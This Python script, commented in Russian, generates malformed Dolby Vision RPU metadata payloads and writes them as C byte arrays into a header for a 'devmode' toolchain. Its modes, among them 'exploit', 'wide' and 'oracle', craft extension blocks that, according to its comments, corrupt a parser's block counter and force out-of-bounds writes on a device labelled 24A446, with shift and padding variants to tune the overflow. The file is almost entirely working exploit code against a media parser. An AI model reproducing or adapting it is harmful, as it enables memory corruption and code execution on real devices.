#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""gen_rpu.py — генератор Dolby Vision RPU по формату libdovi/dovi_tool
дополненному измерениями на нашем 24A446.

Формат (libdovi dolby_vision/src/rpu/*):
  rpu_nal_prefix u8 = 25
  rpu_data_header:
     rpu_type u6=2 | rpu_format u11 | vdr_rpu_profile u4 | vdr_rpu_level u4
     vdr_seq_info_present_flag u1
     [если 1] chroma_resampling_explicit_filter_flag u1
              coefficient_data_type u2
              [type==0] coefficient_log2_denom ue
              vdr_rpu_normalized_idc u2
              bl_video_full_range_flag u1
              [rpu_format & 0x700 == 0]
                 bl_bit_depth_minus8 ue | el_bit_depth_minus8 ue
                 vdr_bit_depth_minus8 ue
                 spatial_resampling_filter_flag u1 | reserved_zero_3bits u3
                 el_spatial_resampling_filter_flag u1 | disable_residual_flag u1
     vdr_dm_metadata_present_flag u1
     use_prev_vdr_rpu_flag u1 | [1] prev_vdr_rpu_id ue
  (use_prev_vdr_rpu_flag=1 => rpu_data_mapping пропускается)
  vdr_dm_data_payload (CoreMedia: compressed = reserved_zero_3bits != 0):
     affected_dm_metadata_id ue | current_dm_metadata_id ue | scene_refresh_flag ue
     num_ext_blocks ue | выравнивание нулями до байта
     блоки: ue(length_bytes) | u8(level) | payload | pad до length*8

Блок level 8 (length 13/14): u8 tdi, 6x u12, u12 mid_contrast, u12 clip_trim,
   [length>13] 6x u8 saturation vectors
Блок level 10 (length 5): u8, u12, u12, u8
"""
import struct
import sys


class BW:
    def __init__(self):
        self.bits = []

    def put(self, value, width):
        for i in range(width - 1, -1, -1):
            self.bits.append((value >> i) & 1)

    def ue(self, value):
        v = value + 1
        n = v.bit_length() - 1
        self.bits.extend([0] * n)
        self.put(v, n + 1)

    def align(self):
        while len(self.bits) % 8:
            self.bits.append(0)

    def pad_to(self, nbits):
        while len(self.bits) < nbits:
            self.bits.append(0)

    def nbits(self):
        return len(self.bits)

    def bytes(self):
        assert len(self.bits) % 8 == 0, "not byte aligned: %d bits" % len(self.bits)
        out = bytearray()
        for i in range(0, len(self.bits), 8):
            b = 0
            for k in range(8):
                b = (b << 1) | self.bits[i + k]
            out.append(b)
        return bytes(out)


def level8(w, tdi, fields, length=13, extra=None):
    """Блок level 8. fields: 8 значений по 12 бит; extra: 6 байт (saturation)."""
    w.ue(length)
    w.put(8, 8)
    w.put(tdi, 8)
    for f in fields:
        w.put(f & 0xFFF, 12)
    if length > 13:
        ex = extra if extra is not None else [0xC0 + k for k in range(6)]
        for b in ex:
            w.put(b & 0xFF, 8)


def level10(w, fields, length=5):
    w.ue(length)
    w.put(10, 8)
    w.put(fields[0], 8)
    w.put(fields[1] & 0xFFF, 12)
    w.put(fields[2] & 0xFFF, 12)
    w.put(fields[3], 8)


def level10_wide(w, gate=0x55, pattern=0xAAAA):
    """Блок level 10 с расширенной веткой: поле 0x25c >= 0x13 -> 8 полей по 16 бит.

    Поле 0x25c -- это fields[3] (пишется в элемент A по +6 и сравнивается с 0x13).
    Длина блока 21 Б: 8 (уровень) + 8 + 12 + 12 + 8 + 8*16 = 168 бит.
    """
    w.ue(21)
    w.put(10, 8)
    w.put(0x41, 8)
    w.put(0x42, 12)
    w.put(0x43, 12)
    w.put(gate & 0xFF, 8)
    for _ in range(8):
        w.put(pattern & 0xFFFF, 16)


def build(mode="exploit", profile=1, rpu_format=0x12, level=0,
          full_range=0, disable_residual=1, reserved=1, tdi=0x21,
          coeff_type=0, bit_depth=2, coeff_denom=0, block_shift=0, block_pad=0, count=None, tail=True):
    w = BW()
    w.put(25, 8)                 # rpu_nal_prefix
    w.put(2, 6)                  # rpu_type
    w.put(rpu_format, 11)
    w.put(profile, 4)
    w.put(level, 4)
    w.put(1, 1)                  # vdr_seq_info_present_flag
    w.put(0, 1)                  # chroma_resampling_explicit_filter_flag
    w.put(coeff_type, 2)         # coefficient_data_type
    if coeff_type == 0:
        w.ue(coeff_denom)        # coefficient_log2_denom
    w.put(0, 2)                  # vdr_rpu_normalized_idc
    w.put(full_range, 1)         # bl_video_full_range_flag
    w.ue(bit_depth)              # bl_bit_depth_minus8
    w.ue(bit_depth)              # el_bit_depth_minus8
    w.ue(bit_depth)              # vdr_bit_depth_minus8
    w.put(0, 1)                  # spatial_resampling_filter_flag
    w.put(reserved, 3)           # reserved_zero_3bits -> compressed DM
    w.put(0, 1)                  # el_spatial_resampling_filter_flag
    w.put(disable_residual, 1)   # disable_residual_flag
    w.put(1, 1)                  # vdr_dm_metadata_present_flag
    w.put(1, 1)                  # use_prev_vdr_rpu_flag
    w.ue(0)                      # prev_vdr_rpu_id

    # ---- compressed dm data payload
    w.ue(0)                      # affected_dm_metadata_id
    w.ue(0)                      # current_dm_metadata_id
    w.ue(0)                      # scene_refresh_flag

    if mode == "oracle":
        w.ue(1)                  # num_ext_blocks
        w.align()
        # level 254 (0xfe) length 2: байт -> +0x73ac, байт -> +0x73ad (level)
        w.ue(2)
        w.put(0xFE, 8)
        w.put(0x00, 8)
        w.put(0x01, 8)
    elif mode == "loud":
        # 6 блоков level 8 -> счётчик A = 0x80800607 (мусор), затем level 10
        # => запись по дикому адресу: детектор «парсер дошёл до блоков»
        w.ue(7)
        w.align()
        for i in range(6):
            level8(w, tdi + i, [0x100 + i, 0x101 + i, 0x102 + i, 0x103 + i,
                                0x104 + i, 0x105 + i, 0x106 + i, 0x107 + i], 13)
        level10(w, [0x41, 0x42, 0x43, 0x00], 5)
    elif mode == "plain8":
        n = 6 if count is None else count
        w.ue(n)
        w.align()
        for i in range(n):
            level8(w, tdi + i, [0x100 + i, 0x101 + i, 0x102 + i, 0x103 + i,
                                0x104 + i, 0x105 + i, 0x106 + i, 0x107 + i], 13)
    elif mode == "exploit":
        w.ue(7)                  # num_ext_blocks
        w.align()
        for _ in range(block_shift):
            w.put(0, 1)
        for i in range(5):
            level8(w, tdi + i, [0x100 + i, 0x101 + i, 0x102 + i, 0x103 + i,
                                0x104 + i, 0x105 + i, 0x106 + i, 0x107 + i], 13)
            for _ in range(block_pad):
                w.put(0, 1)
        # 6-й блок: length 14 -> 8 полей по 12 бит (последнее = A count) + 6 байт
        level8(w, tdi + 5, [0xB0, 0xB1, 0xB2, 0xB3, 0xB4, 0xB5, 0xB6, 5],
               14, extra=[0x00, 0x00, 0xD2, 0xD3, 0xD4, 0xD5])
        for _ in range(block_pad):
            w.put(0, 1)
        level10(w, [0x41, 0x42, 0x43, 0x00], 5)
    elif mode == "wide":
        w.ue(7)                  # num_ext_blocks
        w.align()
        for i in range(5):
            level8(w, tdi + i, [0x100 + i, 0x101 + i, 0x102 + i, 0x103 + i,
                                0x104 + i, 0x105 + i, 0x106 + i, 0x107 + i], 13)
        level8(w, tdi + 5, [0xB0, 0xB1, 0xB2, 0xB3, 0xB4, 0xB5, 0xB6, 5],
               14, extra=[0x00, 0x00, 0xD2, 0xD3, 0xD4, 0xD5])
        # level 10 с gate >= 0x13: расширенная ветка, записи +8..+0x16 (до x30)
        level10_wide(w, gate=0x55)

    # терминатор CM v4.0: сначала выравнивание нулями, потом ue(0) = бит "1"
    w.align()
    if tail:
        w.put(1, 1)
    else:
        raise SystemExit("unknown mode")

    w.align()
    return w.bytes()


def c_array(name, data):
    lines = ["static const unsigned char %s[] = {" % name]
    for i in range(0, len(data), 16):
        lines.append("    " + ", ".join("0x%02x" % b for b in data[i:i + 16]) + ",")
    lines.append("};")
    lines.append("static const unsigned int %s_len = %d;" % (name, len(data)))
    return "\n".join(lines)


MATRIX = [
    # (имя, профиль, rpu_format, full_range, disable_residual, coeff_type, bitdepths)
    ("m01_p1_f12", 1, 0x12, 0, 1, 0, 2),
    ("m02_p1_f10", 1, 0x10, 0, 1, 0, 2),
    ("m03_p1_f0e", 1, 0x0E, 0, 1, 0, 2),
    ("m04_p1_f00", 1, 0x00, 0, 1, 0, 2),
    ("m05_p0_f12", 0, 0x12, 1, 1, 0, 2),
    ("m06_p1_f12_nores", 1, 0x12, 0, 0, 0, 2),
    ("m07_p1_f12_ct1", 1, 0x12, 0, 1, 1, 2),
    ("m08_p1_f12_bd0", 1, 0x12, 0, 1, 0, 0),
    ("m09_p1_f12_bd4", 1, 0x12, 0, 1, 0, 4),
    ("m10_p1_f700", 1, 0x700, 0, 1, 0, 2),
    ("m11_p1_denom1", 1, 0x12, 0, 1, 0, 2),
    ("m12_p1_denom23", 1, 0x12, 0, 1, 0, 2),
]

DENOMS = {"m11_p1_denom1": 1, "m12_p1_denom23": 23}


def main():
    out = []
    variants = [
        ("rpu_v1_oracle", build("oracle", profile=1, rpu_format=0x12)),
        ("rpu_v1_exploit", build("exploit", profile=1, rpu_format=0x12)),
        ("rpu_v1_wide", build("wide", profile=1, rpu_format=0x12)),
        ("rpu_v2_exploit", build("exploit", profile=0, rpu_format=0x12, full_range=1,
                                 disable_residual=0)),
        ("rpu_v3_exploit", build("exploit", profile=1, rpu_format=0x10)),
        ("rpu_s1", build("exploit", profile=1, rpu_format=0x12, block_shift=1)),
        ("rpu_s2", build("exploit", profile=1, rpu_format=0x12, block_shift=2)),
        ("rpu_s3", build("exploit", profile=1, rpu_format=0x12, block_shift=3)),
        ("rpu_p1", build("exploit", profile=1, rpu_format=0x12, block_pad=1)),
        ("rpu_p2", build("exploit", profile=1, rpu_format=0x12, block_pad=2)),
        ("rpu_probe6", build("plain8", profile=1, rpu_format=0x12, count=6)),
        ("rpu_probe7", build("plain8", profile=1, rpu_format=0x12, count=7)),
    ]
    for name, data in variants:
        print("%-16s %3d B  %s" % (name, len(data), data[:12].hex()))
        out.append(c_array(name, data))

    # матрица заголовков (все — oracle-режим: один блок 0xfe)
    names = []
    for (name, prof, fmt, fr, dis, ct, bd) in MATRIX:
        data = build("oracle", profile=prof, rpu_format=fmt, full_range=fr,
                     disable_residual=dis, coeff_type=ct, bit_depth=bd,
                     coeff_denom=DENOMS.get(name, 0))
        sym = "rpu_" + name
        names.append((name, sym, len(data)))
        out.append(c_array(sym, data))
        print("%-16s %3d B  %s" % (name, len(data), data[:10].hex()))

    table = ["typedef struct { const char *name; const unsigned char *p; unsigned int n; } rpu_case;",
             "static const rpu_case rpu_matrix[] = {"]
    for name, sym, n in names:
        table.append('    {"%s", %s, %s_len},' % (name, sym, sym))
    table.append("};")
    table.append("static const int rpu_matrix_len = %d;" % len(names))
    out.append("\n".join(table))

    hdr = ("// auto-generated by tools/devmode/gen_rpu.py — не править руками\n"
           "#ifndef RPU_PAYLOADS_H\n#define RPU_PAYLOADS_H\n\n" + "\n\n".join(out) +
           "\n\n#endif\n")
    with open(r"D:\kc27\tools\devmode\rpu_payloads.h", "w", encoding="utf-8", newline="\n") as f:
        f.write(hdr)
    print("written tools/devmode/rpu_payloads.h")


if __name__ == "__main__":
    main()
